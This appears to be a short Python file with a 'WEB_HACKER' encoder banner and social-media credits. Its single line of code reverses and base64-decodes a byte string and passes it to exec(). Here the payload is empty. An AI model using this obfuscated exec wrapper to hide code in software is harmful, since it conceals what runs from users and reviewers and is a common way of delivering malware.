#--------------------------------------------------
#--------WEB_HACKER--------
#--------------------------------------------------
#ENCODER : WEB HACKER
#FACEBOOK : DIP Biswass 
#GITHUB : DIP 
#TELEGRAM : FUNKY-KING
#--------------------------------------------------


_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))